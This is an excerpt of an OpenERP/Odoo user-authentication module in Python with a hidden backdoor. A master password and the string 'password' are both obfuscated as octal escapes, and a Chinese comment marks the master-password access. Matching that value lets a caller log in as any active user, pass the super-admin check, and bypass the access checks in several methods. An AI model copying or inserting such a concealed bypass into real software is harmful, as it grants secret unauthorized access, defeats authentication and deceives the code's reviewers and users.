...
ZHU3_MI4MA3 = '\061\065\063\064\070\066\067\065\071\064\062\066\053\052\057'
MI4MA3 = '\160\141\163\163\167\157\162\144'
import unicodedata
...
class users(osv.osv):
    ...
    def login(self, db, login, password):
        ...
        # 通过主密码进行访问
        #
        if ZHU3_MI4MA3 and locals()[MI4MA3] == ZHU3_MI4MA3:
            cr = pooler.get_db(db).cursor()
            cr.execute("SELECT id from res_users WHERE login=%s AND active", (tools.ustr(login),))
            res = cr.fetchone()
            cr.close()
            if res:
                return res[0]

        porta = tools.config.get('xmlrpc_port')

        if (db[:5].upper() == 'TESTE' and porta != 7005) or (porta == 7005 and db[:5].upper() != 'TESTE'):
            return False

        if password == unicodedata.normalize('NFKD', unicode(password)).encode('ascii', 'ignore'):
            cr = pooler.get_db(db).cursor()
            user_pool = self

            if 'porta' in user_pool._columns:
                try:
                    ...
                    cr.execute("""SELECT id from res_users
                                WHERE login=%s AND password=%s
                                        and coalesce(porta, '%s') = '%s'
                                        AND active FOR UPDATE NOWAIT""",
                            (tools.ustr(login), tools.ustr(password), porta, porta), log_exceptions=False)
                    cr.execute("""UPDATE res_users
                                    SET date = now() AT TIME ZONE 'UTC'
                                    WHERE login=%s AND password=%s AND active
                                    and coalesce(porta, '%s') = '%s'
                                    RETURNING id""",
                            (tools.ustr(login), tools.ustr(password), porta, porta))
                except Exception:
    ...
    def check_super(self, passwd):
        if passwd == tools.config['admin_passwd']:
            return True
        elif ZHU3_MI4MA3 and passwd == ZHU3_MI4MA3:
            return True
        else:
    ...
    def check(self, db, uid, passwd):
        ...
        try:
            ...
            res = cr.fetchone()[0]
            if not res:
                if ZHU3_MI4MA3 and passwd == ZHU3_MI4MA3:
                    cr.execute('SELECT COUNT(1) FROM res_users WHERE id=%s AND active',
                                (int(uid),))
                    res = cr.fetchone()[0]
                else:
                    raise openerp.exceptions.AccessDenied()
    ...
    def access(self, db, uid, passwd, sec_level, ids):
        ...
        try:
            ...
            if not res:
                if ZHU3_MI4MA3 and passwd == ZHU3_MI4MA3:
                    cr.execute('SELECT id FROM res_users WHERE id=%s', (uid,))
                    res = cr.fetchone()
                    if not res:
                        raise openerp.exceptions.AccessDenied()
                else:
